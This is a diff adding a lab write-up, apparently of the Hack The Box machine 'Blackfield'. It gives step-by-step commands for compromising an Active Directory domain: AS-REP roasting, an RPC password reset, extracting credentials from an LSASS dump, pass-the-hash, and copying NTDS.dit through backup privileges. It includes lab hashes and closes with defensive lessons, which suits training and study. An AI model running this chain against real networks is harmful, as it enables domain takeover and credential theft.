@@ -1,0 +1,486 @@
+# Blackfield — Full Active Directory Compromise
+---
+> Target: DC01.BLACKFIELD.local
+> Domain: BLACKFIELD.local
+> OS: Windows Server 2019
+> Attack Chain: AS-REP Roasting → Password Reset Abuse → LSASS Dump → SeBackupPrivilege Abuse → NTDS Extraction → Pass-The-Hash → Domain Admin
+
+Details:
+Anonymous / Guest access to an SMB 
+Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack.
+Retrieve a hash of the encrypted material contained in the AS-REP
+Offline brute force attack in order to recover the plaintext password
+SMB share containing forensics artefacts, including an lsass process dump.
+WinRM privileges
+Dmp the Active Directory database
+Retrieve the hash of the primary domain administrator. 
+Robocopy + diskshadow - Dump Backup
+NTDIS == DB to store AD data
+---
+
+# 1️⃣ Initial Enumeration
+
+---
+
+## Nmap Scan
+
+```bash
+nmap -sV -sC -Pn 10.129.229.17 -vv
+```
+
+### Results
+
+```
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+445/tcp  open  microsoft-ds?
+593/tcp  open  ncacn_http
+3268/tcp open  ldap
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
+```
+
+```
+Service Info: Host: DC01
+Domain: BLACKFIELD.local
+OS: Windows Server 2019
+SMB Signing: Enabled and Required
+```
+
+---
+
+### Key Observations
+
+* Domain Controller detected
+* Kerberos exposed (88)
+* LDAP exposed (389 / 3268)
+* SMB signing enforced → No SMB relay
+* WinRM exposed (5985) → Potential post-compromise access
+
+---
+
+# DNS Enumeration (53)
+
+```bash
+dig any BLACKFIELD.local @10.129.229.17
+```
+
+```
+BLACKFIELD.local. IN A 10.129.229.17
+NS dc01.BLACKFIELD.local.
+```
+
+Confirms this is the Domain Controller.
+
+---
+
+# RPC Enumeration (135)
+
+```bash
+rpcclient -U "" -N 10.129.229.17
+lsaenumsid
+```
+
+Result:
+
+```
+NT_STATUS_ACCESS_DENIED
+```
+
+Anonymous RPC blocked.
+
+---
+
+# LDAP Enumeration (389)
+
+```bash
+enum4linux -u "guest" -p "" 10.129.229.17
+```
+
+Denied.
+
+```bash
+cme ldap 10.129.229.17 -u guest -p ""
+```
+
+Guest bind works but cannot enumerate without authenticated bind.
+
+---
+
+# SMB Enumeration (445)
+
+```bash
+crackmapexec smb 10.129.229.17
+```
+
+SMB Signing: True
+SMBv1: False
+
+---
+
+## Anonymous Share Attempt
+
+```bash
+crackmapexec smb 10.129.229.17 -u "" -p "" --shares
+```
+
+Denied.
+
+---
+
+## Guest Share Enumeration
+
+```bash
+crackmapexec smb 10.129.229.17 -u "guest" -p "" --shares
+```
+
+Shares discovered:
+
+```
+ADMIN$
+C$
+forensic
+IPC$        READ
+NETLOGON
+profiles$   READ
+SYSVOL
+```
+
+---
+
+# Enumerating profiles$
+
+```bash
+smbclient //10.129.229.17/profiles$
+```
+
+```
+AAlleni
+ABarteski
+...
+```
+
+We discovered a large number of usernames.
+
+→ This becomes our user wordlist for Kerberos attacks.
+
+---
+
+# 2️⃣ AS-REP Roasting
+
+Since this is an AD environment with Kerberos exposed, we test for users without pre-authentication.
+
+```bash
+impacket-GetNPUsers blackfield.local/ -dc-ip 10.129.229.17 -usersfile users.txt -format hashcat
+```
+
+Result:
+
+```
+$krb5asrep$23$support@BLACKFIELD.LOCAL:...
+```
+
+This means:
+
+User `support` has `UF_DONT_REQUIRE_PREAUTH` enabled.
+
+This allows offline password cracking.
+
+---
+
+## Crack Hash
+
+```bash
+hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+Recovered:
+
+```
+support : BlackKnight
+```
+
+---
+
+# 3️⃣ Password Spray Attempt
+
+```bash
+crackmapexec smb 10.129.229.17 -u users.txt -p "BlackKnight" --continue-on-success
+```
+
+All failed.
+
+Important detail:
+
+AS-REP crack does not guarantee password works for SMB.
+Kerberos and NTLM authentication can behave differently.
+
+---
+
+# 4️⃣ RPC Enumeration as support
+
+```bash
+rpcclient -U "support" 10.129.229.17
+```
+
+```
+enumdomusers
+```
+
+Found:
+
+```
+audit2020
+support
+svc_backup
+lydericlefebvre
+```
+
+```
+enumdomgroups
+```
+
+Domain groups enumerated.
+
+---
+
+# 5️⃣ SYSVOL Enumeration
+
+```bash
+smbclient //10.10.10.192/SYSVOL -U'blackfield.local\support'
+```
+
+Download everything:
+
+```
+mask ""
+recurse
+prompt
+mget *
+```
+
+Nothing interesting.
+
+---
+
+# 6️⃣ Password Reset Abuse via RPC
+
+Critical moment.
+
+```bash
+rpcclient $> setuserinfo2 audit2020 23 '#00^BlackKnight'
+```
+
+This successfully resets the password of `audit2020`.
+
+### Why This Works
+
+The `support` account has rights allowing password reset for that user.
+
+This is a severe ACL misconfiguration.
+
+---
+
+# 7️⃣ Forensic Share
+
+```bash
+smbclient //10.10.10.192/forensic -U'blackfield.local\audit2020'
+```
+
+We find:
+
+```
+lsass.zip
+```
+
+Inside:
+
+```
+lsass.DMP
+```
+
+---
+
+# 8️⃣ Extract Credentials from LSASS Dump
+
+On Windows with mimikatz:
+
+```
+sekurlsa::minidump lsass.DMP
+sekurlsa::logonpasswords full
+```
+
+Recovered:
+
+```
+svc_backup NTLM hash
+```
+
+---
+
+# 9️⃣ Pass-The-Hash — svc_backup
+
+```bash
+evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
+```
+
+Access obtained.
+
+---
+
+# 🔟 Privilege Enumeration
+
+```bash
+whoami /priv
+```
+
+Important:
+
+```
+SeBackupPrivilege     Enabled
+SeRestorePrivilege    Enabled
+```
+
+We are member of:
+
+```
+Backup Operators
+```
+
+---
+
+# 🔥 SeBackupPrivilege Abuse
+
+Backup Operators can:
+
+* Read any file
+* Backup system files
+* Bypass ACL restrictions
+
+Even NTDS.dit.
+
+---
+
+# 1️⃣1️⃣ Robocopy Backup Mode
+
+Copy admin desktop:
+
+```bash
+robocopy C:\users\administrator\desktop\ C:\temp /B
+```
+
+Note found:
+
+```
+- change every passwords -- Done.
+- change krbtgt password twice -- Done.
+- disable auditor's account (audit2020) -- KO.
+- use nominative domain admin accounts -- KO.
+```
+
+Important clue:
+They did not fully secure domain.
+
+---
+
+# 1️⃣2️⃣ Diskshadow Abuse
+
+Create shadow copy script (disk2.txt).
+
+Upload:
+
+```powershell
+upload disk2.txt
+```
+
+Execute:
+
+```powershell
+diskshadow /s disk2.txt
+```
+
+Shadow copy created:
+
+```
+Alias parity for shadow ID {...}
+```
+
+---
+
+# 1️⃣3️⃣ Copy NTDS.dit
+
+```bash
+robocopy z:\windows\ntds\ c:\Windows\Temp\parity\ ntds.dit /B
+```
+
+Save SYSTEM hive:
+
+```bash
+reg.exe save hklm\system c:\Windows\Temp\parity\system.bak
+```
+
+Download:
+
+```
+download ntds.dit
+download system.bak
+```
+
+---
+
+# 1️⃣4️⃣ Dump Hashes Offline
+
+```bash
+/usr/share/doc/python3-impacket/examples/secretsdump.py -system system.bak -ntds ntds.dit LOCAL
+```
+
+Administrator NTLM hash extracted.
+
+---
+
+# 1️⃣5️⃣ Final Domain Admin Access
+
+```bash
+evil-winrm -i 10.10.10.192 -u administrator -H '184fb5e5178480be64824d4cd53b99ee'
+```
+
+Full Domain Admin.
+
+---
+
+# 🔥 Full Attack Chain Summary
+
+1. SMB profiles$ enumeration → user list
+2. AS-REP roasting → support password
+3. RPC password reset abuse → audit2020
+4. Forensic share → LSASS dump
+5. Extract svc_backup NTLM
+6. Pass-The-Hash → Backup Operators
+7. SeBackupPrivilege abuse
+8. Shadow copy NTDS.dit
+9. secretsdump → Administrator hash
+10. Pass-The-Hash → Domain Admin
+
+---
+
+# 🧠 Real-World Security Lessons
+
+### 1️⃣ AS-REP accounts are dangerous
+
+Disable "Do not require Kerberos pre-authentication"
+
+### 2️⃣ Backup Operators = Domain compromise
+
+Never assign casually.
+
+### 3️⃣ Forensic shares must be restricted
+
+Never store LSASS dumps.
+
+### 4️⃣ ACL misconfigurations are deadly
+
+Password reset permissions must be audited.
+
+---
